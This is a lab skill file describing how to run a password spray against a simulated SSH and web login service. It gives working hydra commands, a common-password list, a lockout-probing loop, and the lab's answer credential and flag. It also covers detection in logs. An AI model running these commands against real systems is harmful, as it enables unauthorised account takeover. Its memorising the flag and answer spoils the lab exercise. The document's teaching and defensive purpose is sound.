---
name: performing-password-spray-in-lab
description: >-
  Execute controlled password spray attacks against simulated authentication
  services in isolated lab environments to understand how attackers test large
  numbers of accounts with a small set of common passwords. Covers SSH, web
  login, and API endpoint spraying with rate-limit awareness and detection evasion
  understanding for defensive security purposes.
domain: cybersecurity
subdomain: credential-access
tags: [password-spray, credential-access, hydra, burpsuite, intermediate, authentication-testing]
difficulty: intermediate
mitre_techniques: [T1110.003]
nist_csf_functions: [Identify, Protect, Detect]
version: "1.0"
author: mukul975
license: Apache-2.0
lab_environment: labs/cryptography/hash-cracking-lab
---

> ⚠️ **Educational Use Only** — Password spraying against systems you do not own or have explicit written authorization to test is illegal under computer fraud laws globally. This skill exists to help defenders understand attack patterns so they can detect and prevent them. Always practice only in isolated lab environments.

## When to Use

- During authorized penetration tests to test authentication endpoint lockout policies and account security
- In CTF challenges with multiple user accounts and a common weak password
- When auditing an organization's password policy — testing whether common passwords are in use
- When learning how to detect password spray attacks in logs and SIEM dashboards
- As a prerequisite for credential stuffing, Active Directory brute force, and account takeover simulations

## Prerequisites

- **Knowledge:** Basic understanding of authentication flows (SSH, HTTP), what a user account is
- **Lab:** `labs/cryptography/hash-cracking-lab` (shared environment)
- **Difficulty:** Intermediate
- **Time:** 25–35 minutes

## Workflow

### Step 1: Start the Lab

```bash
agentlab start hash-cracking-lab
agentlab exec hash-cracking-lab bash
# SSH service running on target:22
# Web login at http://target:80/login
# User list at /lab/users.txt
cat /lab/users.txt
# admin, alice, bob, charlie, developer, sysadmin
```

### Step 2: Generate a Targeted Password List

Password spray uses few passwords across many accounts (avoiding lockout):

```bash
# Common passwords to try first
cat > /tmp/spray_passwords.txt << 'EOF'
Password1
Password123
Summer2025!
Winter2024!
Company123
Welcome1
Spring2026
January2026
EOF
```

### Step 3: SSH Password Spray with Hydra

```bash
# Spray one password at a time across all users
# -L: user list, -p: single password, -t: threads, -W: wait between attempts
hydra -L /lab/users.txt -p "Password123" \
      ssh://target:22 \
      -t 4 -W 2 -v

# Try each password from the spray list
for pass in Password1 Password123 "Summer2025!"; do
  echo "Trying: $pass"
  hydra -L /lab/users.txt -p "$pass" ssh://target:22 -t 4 -W 2 2>/dev/null \
    | grep "login:"
done
```

### Step 4: Web Login Spray with Hydra

```bash
# First, identify the login form parameters
curl -s http://target:80/login | grep -i "name="
# <input name="username"...> <input name="password"...>

# Spray web login form
hydra -L /lab/users.txt -p "Password123" \
      target:80 http-post-form \
      "/login:username=^USER^&password=^PASS^:Invalid credentials" \
      -t 4 -W 3
```

### Step 5: Understand Lockout Policy Behavior

Watch the responses carefully:

```bash
# Count attempts per user — if locked out after 5 tries, space attempts across users
# A spray of 1 password × N users = only 1 attempt per account
# This bypasses lockout policies that trigger after 5+ attempts per account

# In the lab, check lockout behavior:
for i in 1 2 3 4 5 6; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://target:80/login \
    -d "username=admin&password=wrong$i")
  echo "Attempt $i: HTTP $code"
done
# HTTP 200 with error = normal
# HTTP 429 = rate limited
# HTTP 423 = account locked
```

### Step 6: Detection — Read the Logs

Understanding what password sprays look like in logs is as important as performing them:

```bash
# Check the authentication log on the target
agentlab exec hash-cracking-lab target cat /var/log/auth.log | tail -20
# Look for: many "Failed password" entries from the same IP
# That's what blue team detects

# In a SIEM, the signature is:
# Many users, same source IP, same time window, same password attempt
```

### Step 7: Capture the Flag

One user has a common password:

```bash
hydra -L /lab/users.txt \
      -P /tmp/spray_passwords.txt \
      ssh://target:22 \
      -t 2 -W 5
# Found: developer:Password123

ssh developer@target
cat ~/flag.txt
# FLAG{password_spray_one_user_had_weak_password}
```

## Key Concepts

| Concept | Definition |
|---------|-----------|
| Password Spray | Low-and-slow attack: try one or few common passwords across many accounts to avoid lockout |
| Credential Stuffing | Using leaked username:password pairs from data breaches — different from spray |
| Account Lockout | Policy that locks an account after N failed attempts — spray evades this intentionally |
| Rate Limiting | Server-side control that limits login attempts per IP per time window |
| T1110.003 | MITRE ATT&CK: Brute Force — Password Spraying |

## Tools

| Tool | Purpose | Lab Availability |
|------|---------|-----------------|
| `hydra` | Network login brute forcer with protocol support | ✅ Pre-installed |
| `medusa` | Fast parallel brute forcer | ✅ Pre-installed |
| `spray` | Purpose-built password spray tool | ✅ Pre-installed |
| `crackmapexec` | Windows/AD credential testing | ✅ Pre-installed |

## Output / Verification

```bash
agentlab verify hash-cracking-lab "FLAG{password_spray_one_user_had_weak_password}"
```

**Defensive value:** After completing this challenge, you should be able to write a SIEM detection rule: alert when >5 unique usernames fail authentication from the same IP within 5 minutes.

## Further Reading

- MITRE ATT&CK: [T1110.003 — Password Spraying](https://attack.mitre.org/techniques/T1110/003/)
- [OWASP Authentication Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Brute_Force_Vulnerabilities)
- [Microsoft: Defending Against Password Spray](https://learn.microsoft.com/en-us/security/operations/incident-response-playbook-password-spray)
